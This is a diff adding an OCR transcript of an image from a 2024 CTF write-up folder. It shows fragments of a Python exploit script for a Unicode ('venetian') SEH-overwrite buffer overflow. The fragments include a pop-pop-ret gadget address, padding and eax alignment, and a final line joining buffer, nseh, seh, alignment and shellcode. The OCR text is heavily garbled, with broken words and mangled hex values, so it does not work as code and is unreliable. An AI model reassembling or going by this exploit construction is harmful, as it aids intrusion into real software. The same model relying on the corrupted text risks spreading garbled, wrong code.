@@ -1,0 +1,26 @@
+# OCR: bb5a616ffcbe16cfa3043820504d3c79.webp
+# 来源: .\02-WriteUp\2024\bb5a616ffcbe16cfa3043820504d3c79.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:18
+
+pwn
+shutil
+os.path
+= bytes to f the buffer
+= next SEH addre @x00590071 (a harmless padding
+= EH handler «00430015: pop ecx ; pop ebp
+padding
+leax_align # venetian pad/align
+leax_align + sh ecx
+leax_align + venetian pad/alig
+leax_align
+leax_align + venetian pad/align
+eax_align + 0x1100230¢
+leax_align # venetian pad/alig:
+eax_align + eax, «11001100
+leax_align + venetian pad/align
+leax_align push ea
+leax_align pad to align the f
+leax_align + to eax
+5heltcode
+shellcode = buffer + nseh + seh + eax_align + padd + shellcode
